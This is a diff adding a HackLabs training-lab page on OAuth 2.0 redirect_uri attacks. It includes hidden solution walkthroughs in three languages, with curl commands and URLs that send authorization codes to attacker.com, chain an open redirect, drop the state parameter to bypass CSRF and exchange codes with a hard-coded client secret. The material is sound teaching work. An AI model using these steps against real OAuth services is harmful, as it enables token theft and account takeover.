@@ -1,0 +1,214 @@
+{% extends "base.html" %}
+{% block title %}V14 – OAuth 2.0 Attacks – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  {% with messages = get_flashed_messages(with_categories=true) %}
+    {% if messages %}{% for category, msg in messages %}
+      <div class="alert-{{ category if category in ['success','warning','error'] else 'success' }} mb-4 text-sm font-mono">{{ msg }}</div>
+    {% endfor %}{% endif %}
+  {% endwith %}
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="oauth_flow">Authorization Flow</h2>
+    <p class="text-xs text-gray-400 mb-3" data-i18n="oauth_flow_desc">Click the button below to start the OAuth 2.0 authorization flow. The server will redirect you to the callback with an authorization code.</p>
+
+    <div class="rounded-lg px-3 py-2.5 mb-3 overflow-x-auto"
+         style="background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08)">
+      <code class="text-xs font-mono break-all" style="color:var(--hl-primary)">/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri={{ target_base }}/oauth/callback&amp;state=abc123&amp;scope=read</code>
+    </div>
+
+    <form method="GET" action="/oauth/authorize" class="inline">
+      <input type="hidden" name="client_id" value="hacklabs-app">
+      <input type="hidden" name="redirect_uri" value="{{ target_base }}/oauth/callback">
+      <input type="hidden" name="state" value="abc123">
+      <input type="hidden" name="scope" value="read">
+      <button type="submit" class="btn-primary" data-i18n="oauth_start_btn">Start OAuth Flow</button>
+    </form>
+  </div>
+
+  {% if token_data %}
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="oauth_token">Access Token</h2>
+    <div class="rounded-lg px-3 py-2.5 mb-3 overflow-x-auto"
+         style="background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08)">
+      <code class="text-xs font-mono break-all" style="color:var(--hl-primary)">{{ token }}</code>
+    </div>
+    <div class="mt-3 text-xs text-gray-400" data-i18n="oauth_userinfo_hint">
+      Use this token to access protected resources:
+      <pre class="mt-1 rounded px-2 py-1.5 text-xs font-mono overflow-x-auto"
+         style="background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08)">curl {{ target_base }}/oauth/userinfo -H "Authorization: Bearer {{ token }}"</pre>
+    </div>
+  </div>
+  {% endif %}
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="oauth_how">How OAuth redirect_uri Attack Works</h2>
+    <p class="text-xs text-gray-400 leading-relaxed mb-2" data-i18n="oauth_how_desc"></p>
+    <ol class="text-xs text-gray-400 space-y-1 list-decimal list-inside">
+      <li data-i18n="oauth_step1">User clicks "Authorize" in the legitimate app</li>
+      <li data-i18n="oauth_step2">Attacker intercepts the request and replaces redirect_uri</li>
+      <li data-i18n="oauth_step3">Authorization code is sent to the attacker's server</li>
+      <li data-i18n="oauth_step4">Attacker exchanges the code for an access token</li>
+      <li data-i18n="oauth_step5">Attacker accesses the victim's resources</li>
+    </ol>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Easy — Open redirect_uri (cualquier URI aceptada)</h3>
+    <p>El servidor de autorización acepta cualquier redirect_uri sin validación. El código de autorización se envía donde el atacante indique.</p>
+    <ol>
+      <li>Intercepta la petición de autorización con Burp Suite y cambia redirect_uri:
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri=http://attacker.com/steal&amp;state=abc123&amp;scope=read</pre>
+      </li>
+      <li>El código llega a attacker.com. Intercámbialo por un token:
+        <pre>curl -X POST {{ target_base }}/oauth/token \
+  -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri=http://attacker.com/steal"</pre>
+      </li>
+      <li>Accede al recurso protegido con el token:
+        <pre>curl {{ target_base }}/oauth/userinfo -H "Authorization: Bearer TOKEN"</pre>
+      </li>
+    </ol>
+
+    <h3>Medium — Dominio validado, bypass por path</h3>
+    <p>Solo se valida el dominio, no el path completo. Usa el mismo dominio con un path diferente.</p>
+    <ol>
+      <li>Cambia el path de redirect_uri manteniendo el dominio permitido:
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri={{ target_base }}/evil-path&amp;state=abc123&amp;scope=read</pre>
+      </li>
+      <li>O encadena con un open redirect en el dominio permitido:
+        <pre>redirect_uri={{ target_base }}/open_redirect?url=http://attacker.com</pre>
+      </li>
+      <li>El código llega al path controlado. Extráelo de los logs/headers y procede como en Easy.</li>
+    </ol>
+
+    <h3>Hard — Whitelist exacta, bypass de state</h3>
+    <p>La redirect_uri debe coincidir exactamente. Encadena con open redirect o elimina el parámetro state para bypass CSRF.</p>
+    <ol>
+      <li>La URI whitelisted apunta a /oauth/callback. Encadena si /open_redirect acepta cualquier url:
+        <pre># Primero comprueba si existe un open redirect en el servidor:
+curl "{{ target_base }}/open_redirect?url=http://attacker.com"
+
+# Si existe, úsalo como destino intermedio:
+# /oauth/callback redirige → /open_redirect → attacker.com</pre>
+      </li>
+      <li>State CSRF bypass: algunos servidores omiten la validación de state si no se envía:
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri={{ target_base }}/oauth/callback&amp;scope=read
+# Nota: sin el parámetro state</pre>
+      </li>
+      <li>Intercambia el código obtenido:
+        <pre>curl -X POST {{ target_base }}/oauth/token \
+      -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri={{ target_base }}/oauth/callback"</pre>
+      </li>
+    </ol>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">jwt.io</span> <span class="tools-badge">OAuth2 Proxied</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Easy — Open redirect_uri (any URI accepted)</h3>
+    <p>The authorization server accepts any redirect_uri without validation. The authorization code is sent wherever the attacker specifies.</p>
+    <ol>
+      <li>Intercept the authorization request with Burp Suite and change redirect_uri:
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri=http://attacker.com/steal&amp;state=abc123&amp;scope=read</pre>
+      </li>
+      <li>The code arrives at attacker.com. Exchange it for a token:
+        <pre>curl -X POST {{ target_base }}/oauth/token \
+  -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri=http://attacker.com/steal"</pre>
+      </li>
+      <li>Access the protected resource with the token:
+        <pre>curl {{ target_base }}/oauth/userinfo -H "Authorization: Bearer TOKEN"</pre>
+      </li>
+    </ol>
+
+    <h3>Medium — Domain validated, path bypass</h3>
+    <p>Only the domain is checked, not the full path. Use the same domain with a different path.</p>
+    <ol>
+      <li>Change the path of redirect_uri while keeping the allowed domain:
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri={{ target_base }}/evil-path&amp;state=abc123&amp;scope=read</pre>
+      </li>
+      <li>Or chain with an open redirect on the allowed domain:
+        <pre>redirect_uri={{ target_base }}/open_redirect?url=http://attacker.com</pre>
+      </li>
+      <li>The code arrives at the controlled path. Extract it from logs/headers and proceed as in Easy.</li>
+    </ol>
+
+    <h3>Hard — Exact whitelist, state bypass</h3>
+    <p>The redirect_uri must match exactly. Chain with an open redirect or drop the state parameter to bypass CSRF check.</p>
+      <ol>
+      <li>The whitelisted URI points to /oauth/callback. Chain if /open_redirect accepts any url:
+        <pre># First check if an open redirect exists on the server:
+curl "{{ target_base }}/open_redirect?url=http://attacker.com"
+
+# If it exists, use it as an intermediate step:
+# /oauth/callback redirects → /open_redirect → attacker.com</pre>
+      </li>
+      <li>State CSRF bypass: some servers skip state validation if the parameter is absent:
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri={{ target_base }}/oauth/callback&amp;scope=read
+# Note: no state parameter</pre>
+      </li>
+      <li>Exchange the obtained code:
+        <pre>curl -X POST {{ target_base }}/oauth/token \
+      -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri={{ target_base }}/oauth/callback"</pre>
+      </li>
+    </ol>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">jwt.io</span> <span class="tools-badge">OAuth2 Proxied</span></div>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>Fácil — Open redirect_uri (qualquer URI aceita)</h3>
+    <p>O servidor de autorização aceita qualquer redirect_uri sem validação. O código de autorização é enviado para onde o atacante indicar.</p>
+    <ol>
+      <li>Intercepte a requisição de autorização com o Burp Suite e altere redirect_uri:
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri=http://attacker.com/steal&amp;state=abc123&amp;scope=read</pre>
+      </li>
+      <li>O código chega a attacker.com. Troque-o por um token:
+        <pre>curl -X POST {{ target_base }}/oauth/token \
+  -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri=http://attacker.com/steal"</pre>
+      </li>
+      <li>Acesse o recurso protegido com o token:
+        <pre>curl {{ target_base }}/oauth/userinfo -H "Authorization: Bearer TOKEN"</pre>
+      </li>
+    </ol>
+
+    <h3>Médio — Domínio validado, bypass por caminho</h3>
+    <p>Apenas o domínio é validado, não o caminho completo. Use o mesmo domínio com um caminho diferente.</p>
+    <ol>
+      <li>Altere o caminho de redirect_uri mantendo o domínio permitido:
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri={{ target_base }}/evil-path&amp;state=abc123&amp;scope=read</pre>
+      </li>
+      <li>Ou encadeie com um open redirect no domínio permitido:
+        <pre>redirect_uri={{ target_base }}/open_redirect?url=http://attacker.com</pre>
+      </li>
+      <li>O código chega ao caminho controlado. Extraia-o dos logs/cabeçalhos e prossiga como no Fácil.</li>
+    </ol>
+
+    <h3>Difícil — Whitelist exata, bypass de state</h3>
+    <p>A redirect_uri deve coincidir exatamente. Encadeie com open redirect ou remova o parâmetro state para bypass de verificação CSRF.</p>
+    <ol>
+      <li>A URI na whitelist aponta para /oauth/callback. Encadeie se /open_redirect aceitar qualquer url:
+        <pre># Primeiro verifique se existe um open redirect no servidor:
+curl "{{ target_base }}/open_redirect?url=http://attacker.com"
+
+# Se existir, use-o como etapa intermediária:
+# /oauth/callback redireciona → /open_redirect → attacker.com</pre>
+      </li>
+      <li>Bypass de CSRF com state: alguns servidores ignoram a validação de state se o parâmetro não for enviado:
+        <pre>{{ target_base }}/oauth/authorize?client_id=hacklabs-app&amp;redirect_uri={{ target_base }}/oauth/callback&amp;scope=read
+# Nota: sem o parâmetro state</pre>
+      </li>
+      <li>Troque o código obtido:
+        <pre>curl -X POST {{ target_base }}/oauth/token \
+      -d "code=CODE&amp;client_id=hacklabs-app&amp;client_secret=app-secret-123&amp;redirect_uri={{ target_base }}/oauth/callback"</pre>
+      </li>
+    </ol>
+
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">jwt.io</span> <span class="tools-badge">OAuth2 Proxied</span></div>
+  </div>
+</div>
+{% endblock %}
